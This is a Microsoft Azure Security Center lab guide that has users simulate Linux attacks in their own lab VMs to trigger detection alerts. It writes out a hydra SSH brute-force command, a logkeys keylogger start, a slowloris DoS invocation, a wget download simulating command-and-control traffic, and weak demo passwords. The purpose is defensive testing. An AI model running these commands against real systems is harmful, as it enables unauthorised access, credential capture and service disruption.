# 04 - Linux Detections
##### Estimated lab time: 
*The following lab is based on the* <a href="https://gallery.technet.microsoft.com/Azure-Security-Center-0ac8a5ef" target="_blank">Linux Detections playbook</a> *written by Yuri Diogenes. This playbook provides a more comphrensive explanation than is covered in this lab*<br>

In this lab we will explore the new Linux detection's in ASC by executing steps in a Kali Linux VM that you are going to deploy. You will connect to your Linux VM(s) leveraging SSH. In case you don't have a SSH client installed, you can install the free edition of MobaXterm <a href="https://mobaxterm.mobatek.net/download.html" target="_blank">here</a>.<br>

#### 1 - Create a Kali Linux VM
1. In the Azure portal, click on **Create a resource** and search for **Kali Linux** and **create** the VM

#### 2 - Create Linux users 
1. Connect to the Linux Victim VM that you have deployed earlier (note: not the Kali VM), using your favorite SSH tool
2. Create 5 users with the names user1, user2, user3, user4, user5, by leveraging the following Linux command:
```powershell
sudo adduser <userName>
```
3. Replace "userName" by user1, user2, etc.<br> Set the password to "mypassword1" for user1, "mypassword2" for user2, etc.

#### 4 - Executing a brute force attack
1. Connect to the Kali Linux VM with SSH (ensure that your VM deployment in step 1 was successful)
2. Navigate to the folder **/usr/share/wordlists**
3. Upload the **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/04%20-%20Linux%20Detections/Files/lab_users.txt" target="_blank">lab_users.txt</a>** and **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/04%20-%20Linux%20Detections/Files/lab_pass.txt" target="_blank">lab_pass.txt</a>** files to this folder by executing:
```text
sudo wget https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/04%20-%20Linux%20Detections/Files/lab_users.txt
```
and
```text
sudo wget https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/04%20-%20Linux%20Detections/Files/lab_pass.txt
```
4. Copy the IP address from the Linux Victim VM that you have deployed earlier. We are going to brute force attack this VM
5.  Type the command below in your Kali VM, and replace "**IP**" with **yourLinuxVM** public IP address
```text
hydra -I -L lab_users.txt -P lab_pass.txt <IP> -t 4 ssh
```
6.  Wait until it finishes, and the result should show you the username and the password that was found

#### 5 - Simulate capturing credentials and other useful information
1.  Run the command below in the Linux Victim VM to simulate an attacker that is trying to start logkeys to set up the system to capture credentials and other useful information: 
```text
logkeys --start
```
***Note**:<br> Ignore the error message if you don't have logkeys installed. Security Center will detect this attack anyway*

#### 6 - Simulate an attack against a web server
Assuming that the attacker has already performed some internal recon using nmap, you are going to simulate an attack against a web server
1. Run the command below in the Linux Victim VM:
```text
perl slowloris.pl -dns server.contoso.com
```
***Note**:<br> Ignore the error message if you don't have this script on your system. Security Center will detect this attack anyway*

#### 7 - Command & Control (C2) simulation
Attackers usually will communicate with command and control (C2) to transfer data or to download more  malicious software.
For this example, you will download the EICAR malware test file using WGET for the IP address.  The commands that follows must be executed in the Linux Victim VM:<br><br>

1. First, obtain the IP address of the target:
```text
nslookup eicar.com 
```
2. Now replace the XXX.XXX.XXX.XXX on the command below with the IP obtained from nslookup: 
```text
wget http://XXX.XXX.XXX.XXX/download/eicar.com
```
***Note**:<br>  if you have issues download eicar.com, try download eicar.txt (same command line, just change the extension).*

#### 8 - Review Security Center alerts
1. Navigate to the **Security Center>Security Alerts** blade (under Threat Protection)
2.  Organize the alerts by date by clicking on the Date column, and review the alerts that were generated during this lab, it should look similar like this:

![alt text](https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/04%20-%20Linux%20Detections/Screenshots/Security_incident_detected_Linux.png)

![alt text](https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/04%20-%20Linux%20Detections/Screenshots/Security_incident_detected_Linux2.png)
